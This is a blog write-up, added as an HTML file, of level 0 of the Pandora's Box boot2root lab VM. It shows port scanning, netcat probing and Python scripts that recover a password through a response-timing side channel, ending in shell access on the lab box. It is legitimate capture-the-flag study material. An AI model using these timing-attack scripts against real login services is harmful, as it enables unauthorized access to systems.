@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Pandora&#39;s Box: 1 - Level 0 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-01-05">January 05, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/pandoras-box">pandora&#39;s box</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Pandora&#39;s Box: 1 - Level 0</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p><a href="https://www.vulnhub.com/entry/pandoras-box-1,111/">Pandora&rsquo;s Box</a> is a boot2root VM written by c0ne.  It focuses on binary exploitation and reverse engineering. You have to complete all 5 levels to root the box.</p>
+
+<p>The binaries in this challenge are absolutely exquisite and extrememly well put together.  I wanted to do rather comprehensive write-up&rsquo;s for each binary, which would mean a *very* long article.  For this reason, I decided to publish each level as a separate blog post.</p>
+
+<h2 id="nmap:bb74457da9a065146c47e6672442f77c">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~/vulnhub/pbox/level_0# nmap -n -sS -p- 192.168.56.103
+
+PORT      STATE SERVICE
+22/tcp    open  ssh
+54311/tcp open  unknown
+</code></pre>
+
+<h2 id="secure-remote-shell:bb74457da9a065146c47e6672442f77c">Secure Remote Shell</h2>
+
+<p>The service on port <code>54311</code> can be connected to using <code>netcat</code>.</p>
+
+<pre><code class="language-text">root@kali:~/vulnhub/pbox/level_0# nc 192.168.56.103 54311
+#######################
+# Secure Remote Shell #
+#######################
+Welcome, please log in
+Password:
+</code></pre>
+
+<p>A few passwords and some flattery didn&rsquo;t get me very far.</p>
+
+<pre><code class="language-text">Password: c0ne r0cks
+Invalid password!
+</code></pre>
+
+<p>Whilst testing for overflows, I found that long strings are split and processed.</p>
+
+<pre><code class="language-text">root@kali:~/vulnhub/pbox/level_0# python -c 'print (&quot;A&quot; * 100)' | nc 192.168.56.103 54311
+#######################
+# Secure Remote Shell #
+#######################
+Welcome, please log in
+Password: Invalid password!
+Password: Invalid password!
+</code></pre>
+
+<p>I then set out to find the maximum length of the buffer, to determine the maximum theoretical length of the password.</p>
+
+<pre><code class="language-text">root@kali:~/vulnhub/pbox/level_0# python -c 'print (&quot;A&quot; * 62)' | nc 192.168.56.103 54311
+#######################
+# Secure Remote Shell #
+#######################
+Welcome, please log in
+Password: Invalid password!
+Password:
+</code></pre>
+
+<p>I did write a python script that would attempt passwords from the <code>rockyou</code> wordlist but nothing popped, and if the password was of any significant length a straight <code>AAAA - ZZZZ</code> bruteforce would take too long.</p>
+
+<h2 id="time-based-attack:bb74457da9a065146c47e6672442f77c">Time Based Attack</h2>
+
+<p>If you send keystrokes manually, you can see there is a difference in the amount of *time* it takes for the binary to return <code>Invalid password!</code>.  The longer the string, the more pronounced the difference is.</p>
+
+<script type="text/javascript" src="https://asciinema.org/a/15311.js" id="asciicast-15311" async></script>
+
+<p>You may need to watch it a few times to see.  But we can confirm there&rsquo;s a difference by timing it in python.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+import socket, time
+
+target = '192.168.56.103'
+port = 54311
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+banner = s.recv(512)
+prompt = s.recv(512)
+
+s.send(&quot;A\n&quot;)
+
+t0 = time.time()
+response = s.recv(512)
+prompt = s.recv(512)
+t1 = time.time()
+
+s.send(&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&quot;)
+
+t2 = time.time()
+response = s.recv(512)
+prompt = s.recv(512)
+t3 = time.time()
+
+print &quot;Short: &quot; + str(t1-t0)
+print &quot;Long: &quot; + str(t3-t2)
+
+s.close()
+</code></pre>
+
+<pre><code class="language-text">root@kali:~/vulnhub/pbox/level_0# ./level_0.py 
+Short: 0.0451579093933
+Long: 0.26290678978
+</code></pre>
+
+<p>You can see there is a significantly longer wait for the error message to be returned after sending the longer string.  We can take this a step further and time the response of a single character.</p>
+
+<p>For just 1 run, the results were a bit hit-and-miss, so it&rsquo;s better to send a character several times and work out the average response time.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+import socket, time, string, numpy
+
+target = '192.168.56.103'
+port = 54311
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+banner = s.recv(512)
+prompt = s.recv(512)
+
+for char in (string.ascii_letters + string.digits + string.punctuation):
+
+	t0 = time.time()
+	s.send(char + &quot;\n&quot;)
+	s.recv(512)
+	t1 = time.time()
+
+	t2 = time.time()
+	s.send(char + &quot;\n&quot;)
+	s.recv(512)
+	t3 = time.time()
+
+	t4 = time.time()
+	s.send(char + &quot;\n&quot;)
+	s.recv(512)
+	t5 = time.time()
+
+	t6 = time.time()
+	s.send(char + &quot;\n&quot;)
+	s.recv(512)
+	t7 = time.time()
+
+	times = [(t7-t6), (t5-t4), (t3-t2), (t1-t0)]
+	average = numpy.mean(times)
+
+	print char + &quot;: &quot; + str(average)
+
+s.close()
+</code></pre>
+
+<p>If this is run a few times and sorted on the 2nd column, we can easily see that the letter <code>R</code> is consistently the quickest character to be returned.</p>
+
+<pre><code class="language-text">root@kali:~/vulnhub/pbox/level_0# ./level_0.py | sort -s -n -k 2,2 | head -n 5
+R: 0.00170934200287
+d: 0.0026016831398
+b: 0.00287199020386
+i: 0.00288355350494
+g: 0.00291323661804
+</code></pre>
+
+<p>We can assume therefore, that the password begins with <code>R</code>.  Finally, modify the script so that it will automatically move onto the next character to deciper the entire password.  We will assume that if the character reponse is quicker than <code>0.002s</code>, then it&rsquo;s valid.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+import socket, time, string, numpy, sys
+
+target = '192.168.56.103'
+port = 54311
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+banner = s.recv(512)
+prompt = s.recv(512)
+
+passwd = ''
+
+for n in range(0, 62):
+	for char in (string.ascii_letters + string.digits + string.punctuation):
+
+		t0 = time.time()
+		s.send(passwd + char + &quot;\n&quot;)
+		s.recv(512)
+		t1 = time.time()
+
+		t2 = time.time()
+		s.send(passwd + char + &quot;\n&quot;)
+		s.recv(512)
+		t3 = time.time()
+
+		t4 = time.time()
+		s.send(passwd + char + &quot;\n&quot;)
+		s.recv(512)
+		t5 = time.time()
+
+		t6 = time.time()
+		s.send(passwd + char + &quot;\n&quot;)
+		s.recv(512)
+		t7 = time.time()
+
+		times = [(t7-t6), (t5-t4), (t3-t2), (t1-t0)]
+		average = numpy.mean(times)
+
+		if average &lt; 0.002:
+			passwd = passwd + char
+			sys.stdout.write(&quot;\r&quot; + passwd)
+			sys.stdout.flush()
+			break
+
+s.close()
+</code></pre>
+
+<p>The whole thing derps out when it gets to the end of the valid password, but at least we got it.</p>
+
+<pre><code class="language-text">root@kali:~/vulnhub/pbox/level_0# ./level_0.py 
+R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0daaaaaaaaaaaaaaaa
+</code></pre>
+
+<pre><code class="language-text">root@kali:~/vulnhub/pbox/level_0# nc 192.168.56.103 54311
+#######################
+# Secure Remote Shell #
+#######################
+Welcome, please log in
+Password: R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0d
+Logged in successfully, type exit to close the shell
+Shell$ id; whoami
+uid=1001(level_0) gid=1001(level_0) groups=1001(level_0)
+level_0
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
